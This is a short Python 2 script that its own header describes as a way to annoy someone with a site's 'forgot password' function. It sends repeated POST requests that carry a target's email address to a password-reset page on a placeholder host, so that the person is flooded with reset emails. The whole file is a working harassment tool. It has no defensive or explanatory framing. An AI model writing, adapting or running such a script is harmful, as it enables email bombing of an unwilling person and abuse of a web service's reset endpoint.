# forgot.py - Annoys someone with "forgot password" function
# by dual

import httplib
import time
import urllib

# Define target email address here
EMAIL = 'asdf@example.com'

# Define the number of emails to send + 1 here
NUM   = 2

# POST function
def post():
    params = urllib.urlencode({'username': EMAIL})

    headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
    conn = httplib.HTTPConnection("www.example.com:80")
    conn.request("POST", "/forgotpassword.html", params, headers)
    response = conn.getresponse()

    conn.close()

# Loop to send emails
for i in range(1, NUM):
    post()
    time.sleep(5)
    print "Sent %d emails..." % (i)

print "Done!"
